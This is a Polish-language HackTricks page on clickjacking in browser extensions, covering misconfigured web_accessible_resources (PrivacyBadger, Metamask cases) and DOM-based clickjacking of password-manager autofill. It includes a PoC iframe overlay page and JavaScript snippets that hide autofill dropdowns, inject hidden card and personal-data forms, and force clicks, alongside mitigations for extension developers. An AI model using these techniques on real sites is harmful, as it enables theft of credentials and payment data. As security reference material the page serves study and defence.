# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

Ta strona pokaże wykorzystanie podatności ClickJacking w rozszerzeniu przeglądarki.\
Jeśli nie wiesz, czym jest ClickJacking, sprawdź:


{{#ref}}
../clickjacking.md
{{#endref}}

Rozszerzenia zawierają plik **`manifest.json`**, a ten plik JSON ma pole `web_accessible_resources`. Oto, co mówią [the Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) na ten temat:

> Te zasoby będą wtedy dostępne na stronie internetowej pod adresem URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, który można wygenerować za pomocą **`extension.getURL method`**. Zasoby dodane do allowlisty są serwowane z odpowiednimi nagłówkami CORS, więc są dostępne za pomocą mechanizmów takich jak XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Zasoby wymienione w **`web_accessible_resources`** w rozszerzeniu przeglądarki nie są jedynie dostępne przez sieć; działają także z wbudowanymi uprawnieniami rozszerzenia. Oznacza to, że mogą:

- Zmieniać stan rozszerzenia
- Ładować dodatkowe zasoby
- W pewnym stopniu wchodzić w interakcję z przeglądarką

Jednak ta funkcja stwarza ryzyko bezpieczeństwa. Jeśli zasób w **`web_accessible_resources`** ma znaczącą funkcjonalność, atakujący może osadzić ten zasób na zewnętrznej stronie internetowej. Nieświadomi użytkownicy odwiedzający tę stronę mogą nieumyślnie aktywować osadzony zasób. Taka aktywacja może prowadzić do niezamierzonych konsekwencji, w zależności od uprawnień i możliwości zasobów rozszerzenia.

## PrivacyBadger - przykład

W rozszerzeniu PrivacyBadger wykryto podatność związaną z deklaracją katalogu `skin/` jako `web_accessible_resources` w następujący sposób (Sprawdź oryginalny [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Ta konfiguracja doprowadziła do potencjalnego problemu bezpieczeństwa. Konkretnie, plik `skin/popup.html`, który jest renderowany po interakcji z ikoną PrivacyBadger w przeglądarce, mógł zostać osadzony wewnątrz `iframe`. Takie osadzenie mogło zostać wykorzystane do oszukania użytkowników, aby nieumyślnie kliknęli "Disable PrivacyBadger for this Website". Taka akcja naruszałaby prywatność użytkownika, wyłączając ochronę PrivacyBadger i potencjalnie narażając go na zwiększone śledzenie. Wizualna demonstracja tego exploitu jest dostępna w przykładzie wideo ClickJacking pod adresem [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Aby zaradzić tej podatności, wdrożono proste rozwiązanie: usunięcie `/skin/*` z listy `web_accessible_resources`. Zmiana ta skutecznie zredukowała ryzyko, zapewniając, że zawartość katalogu `skin/` nie może być dostępna ani manipulowana przez web-accessible resources.

Naprawa była prosta: **usuń `/skin/*` z `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Example

A [**post na blogu o ClickJacking w Metamask można znaleźć tutaj**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). W tym przypadku Metamask naprawił lukę, sprawdzając, że protokół używany do dostępu to **`https:`** lub **`http:`** (a nie na przykład **`chrome:`**):

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Kolejny ClickJacking naprawiony** w rozszerzeniu Metamask polegał na tym, że użytkownicy mogli użyć opcji **Click to whitelist**, gdy strona budziła podejrzenia phishingu z powodu `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. Ponieważ ta strona była podatna na Clickjacking, atakujący mógł to wykorzystać, pokazując coś normalnego, by ofiara nie zauważyła kliknięcia dodającego stronę do whitelisty, a następnie wrócić do strony phishingowej, która już będzie na białej liście.

## Steam Inventory Helper Example

Sprawdź następującą stronę, aby zobaczyć, jak **XSS** w rozszerzeniu przeglądarki została połączona z podatnością **ClickJacking**:


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (Password Manager Autofill UIs)

Klasyczny extension Clickjacking wykorzystuje źle skonfigurowane `web_accessible_resources` do osadzania uprzywilejowanego HTML w iframe i wymuszania kliknięć użytkownika. Nowsza klasa, DOM-based extension Clickjacking, celuje bezpośrednio w dropdowny autouzupełniania wstrzykiwane przez password managery do drzewa DOM strony i używa sztuczek CSS/DOM, aby je ukryć lub przysłonić, zachowując jednocześnie możliwość kliknięcia. Jedno wymuszone kliknięcie może wybrać zapisany element i wypełnić kontrolki atakującego danymi wrażliwymi.

### Threat model

- Atakujący kontroluje stronę WWW (lub osiąga XSS/przejęcie subdomeny/zatrucie cache na powiązanej domenie).
- Ofiara ma zainstalowane i odblokowane rozszerzenie password managera (niektóre autouzupełniania działają nawet gdy menedżer nominalnie jest zablokowany).
- Co najmniej jedno kliknięcie użytkownika jest wymuszone (nakładane bannery cookie, dialogi, CAPTCHA, gry itp.).

### Attack flow (manual autofill)

1. Wstrzyknięcie niewidocznego, ale możliwego do fokusowania formularza (pola login/PII/karty kredytowej).
2. Ustawienie focusu na input, aby wywołać dropdown autouzupełniania rozszerzenia w pobliżu pola.
3. Ukrycie lub przysłonięcie UI rozszerzenia, jednocześnie pozostawiając je możliwe do interakcji.
4. Wyrównanie wiarygodnego kontrolera pod ukrytym dropdownem, aby wymusić kliknięcie wybierające pozycję.
5. Odczytanie wypełnionych wartości z formularza atakującego i eksfiltracja.

### How to hide the autofill UI

- Extension element
- Root element opacity (generic):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- Element potomny wewnątrz ShadowRoot typu open (dynamiczny tag, ukryj wewnętrzny iframe):
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- Element nadrzędny
- BODY/HTML sztuczki z opacity, aby UI rozszerzenia był niewidoczny, podczas gdy strona wygląda normalnie (np. tło zrzutu ekranu):
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- Overlay
- Partial overlay: zasłoń wszystko oprócz kilku pikseli, tak aby dropdown pozostał klikalny (upewnij się, że attacker overlay jest ostatni w DOM z maksymalnym z-index, lub użyj Top Layer).
- Full overlay używający pointer-events:none, dzięki czemu kliknięcia przechodzą do ukrytego dropdownu; utrzymaj go trwałym przy pomocy Popover API:
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### Pozycjonowanie kliknięcia ofiary

- Fixed placement: umieścić ukryte rozwijane menu pod wiarygodnym elementem sterującym, takim jak “Zaakceptuj pliki cookie”, “Zamknij” lub pole wyboru CAPTCHA.
- Follow-mouse: przenieść pole wejściowe z fokusem pod kursor, tak aby rozwijane menu za nim podążało; okresowo ponownie ustawiać fokus, aby pojedynczy klik w dowolnym miejscu wybrał element:
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### Wpływ i scenariusze

- Attacker-controlled site: jeden zmuszony klik może exfiltrate dane karty kredytowej (numer/expiry/CVC) i dane osobowe (name, email, phone, address, DOB), które nie są ograniczone do domeny.
- Trusted site with XSS/subdomain takeover/cache poisoning: kradzież po wielu kliknięciach poświadczeń (username/password) i TOTP, ponieważ wiele menedżerów haseł autofilluje na powiązanych subdomenach/domenach nadrzędnych (np. `*.example.com`).
- Passkeys: if the RP doesn’t bind WebAuthn challenges to the session, XSS can intercept the signed assertion; DOM-based clickjacking hides the passkey prompt to elicit the user’s confirming click.

### Ograniczenia

- Wymaga przynajmniej jednego kliknięcia użytkownika i dobrego dopasowania pikseli (realistyczne nakładki ułatwiają wymuszenie kliknięć).
- Auto-lock/logout zmniejsza okna eksploatacji; niektóre menedżery nadal autofillują podczas „locked”.

### Zabezpieczenia dla deweloperów rozszerzeń

- Renderuj autofill UI w Top Layer (Popover API) lub w inny sposób zapewnij, że znajduje się nad stackingiem strony; unikaj przykrycia przez nakładki kontrolowane przez stronę.
- Przeciwdziałaj manipulacjom CSS: preferuj Closed Shadow DOM i monitoruj za pomocą `MutationObserver` podejrzane zmiany stylów w korzeniach UI.
- Wykrywaj wrogie nakładki przed wypełnieniem: wyenumeruj inne elementy top-layer/popover, tymczasowo wyłącz `pointer-events:none`, i użyj `elementsFromPoint()` do wykrycia zasłonięcia; zamknij UI jeśli nakładki istnieją.
- Wykrywaj podejrzane zmiany `opacity` lub stylów elementów `<body>`/`<html>` zarówno przed, jak i po renderze.
- Dla problemów opartych na iframe: ogranicz zakres MV3 `web_accessible_resources` `matches` precyzyjnie i unikaj ujawniania HTML UIs; jeśli HTML jest nieunikniony, serwuj `X-Frame-Options: DENY` lub `Content-Security-Policy: frame-ancestors 'none'`.


## Źródła

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
